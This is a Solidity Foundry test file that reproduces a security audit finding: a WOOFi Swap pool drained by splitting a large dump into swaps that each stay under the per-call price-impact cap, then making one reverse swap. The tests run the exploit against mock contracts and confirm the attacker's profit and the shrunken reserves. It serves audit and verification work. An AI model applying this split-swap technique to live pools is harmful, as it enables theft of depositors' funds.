// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./31886-h-1-pool-can-be-drained-sherlock-woofi-swap-git.sol";

/*//////////////////////////////////////////////////////////////
    WOOFi Swap — pool can be drained (H-1, #31886)

    `maxGamma`/`maxNotionalSwap` bound each swap call's OWN price impact, but
    have no memory across calls in the same transaction. Splitting a
    price-crashing dump into pieces (each individually within the cap)
    achieves a cumulative crash no single allowed swap could reach. Worse,
    the reverse-direction cap bounds only the QUOTE amount spent, never the
    BASE quantity received — so a single bounded reverse swap at the crashed
    price buys back far more base token than was sold, draining the pool.
    Real WOO has no Chainlink feed to bound this manipulation externally.

    - test_exploit: drives the cheatcode-free Exploit end to end, then
      re-asserts the harm from the driver's perspective.
    - test_singleFullSwap_reverts: control — a single FULL-size swap (same
      total amount, one call) reverts on the gamma cap, proving the split
      was REQUIRED to bypass the guard.
    - test_directRebuild_poolDrained: standalone rebuild confirming the same
      mechanism independently, and that the pool's own WOO reserve shrank.
//////////////////////////////////////////////////////////////*/
contract WooFiPoolDrainTest is Test {
    function test_exploit() public {
        Exploit e = new Exploit();
        uint256 before = e.woo().balanceOf(address(e));
        e.run();
        uint256 afterBal = e.woo().balanceOf(address(e));

        assertGt(afterBal, before, "attacker should end up with more WOO than it started with");
        assertGt(afterBal - before, 100_000e18, "profit should be large relative to the amount dumped");
    }

    /// @notice Control: attempting the SAME total dump (100,000 WOO) in ONE
    ///         swap call reverts on the gamma cap — proving the 10-piece
    ///         split was necessary to bypass the per-call guard.
    function test_singleFullSwap_reverts() public {
        MockERC20 woo = new MockERC20();
        MockERC20 usdc = new MockERC20();
        Wooracle oracle = new Wooracle();
        WooPool pool = new WooPool(address(usdc), address(oracle));

        oracle.setState(address(woo), 1e8, 0, 99_000_000_000_000, true);
        pool.setTokenInfo(address(woo), 0, 991_000_000_000_000_000, type(uint128).max);

        woo.mint(address(this), 300_000e18);
        usdc.mint(address(this), 1_000_000e18);
        woo.approve(address(pool), type(uint256).max);
        usdc.approve(address(pool), type(uint256).max);
        pool.deposit(address(woo), 200_000e18);
        pool.deposit(address(usdc), 1_000_000e18);

        vm.expectRevert(bytes("WooPool: !gamma"));
        pool.swap(address(woo), address(usdc), 100_000e18, 0, address(this));
    }

    /// @notice Standalone rebuild mirroring the finding's PoC structure
    ///         directly (no Exploit orchestrator), confirming the pool's own
    ///         WOO reserve shrinks by exactly the attacker's profit.
    function test_directRebuild_poolDrained() public {
        MockERC20 woo = new MockERC20();
        MockERC20 usdc = new MockERC20();
        Wooracle oracle = new Wooracle();
        WooPool pool = new WooPool(address(usdc), address(oracle));

        uint64 coeff = 99_000_000_000_000;
        uint128 maxGamma = 991_000_000_000_000_000;
        uint256 piece = 10_000e18;
        uint256 numPieces = 10;
        uint256 reverseQuote = 5_050_505_050_505_050_505_050;

        oracle.setState(address(woo), 1e8, 0, coeff, true);
        pool.setTokenInfo(address(woo), 0, maxGamma, type(uint128).max);

        woo.mint(address(this), 200_000e18 + piece * numPieces);
        usdc.mint(address(this), 1_000_000e18 + reverseQuote);
        woo.approve(address(pool), type(uint256).max);
        usdc.approve(address(pool), type(uint256).max);
        pool.deposit(address(woo), 200_000e18);
        pool.deposit(address(usdc), 1_000_000e18);

        (uint192 wooReserveBefore,,,) = pool.tokenInfos(address(woo));

        for (uint256 i = 0; i < numPieces; i++) {
            pool.swap(address(woo), address(usdc), piece, 0, address(this));
        }
        pool.swap(address(usdc), address(woo), reverseQuote, 0, address(this));

        (uint192 wooReserveAfter,,,) = pool.tokenInfos(address(woo));

        // Reserve accounting: pool received `piece*numPieces` WOO from the dump,
        // then paid out more than that on the single reverse swap -> net reserve DROP.
        assertLt(wooReserveAfter, wooReserveBefore, "pool's own WOO reserve should shrink (drained)");
    }
}
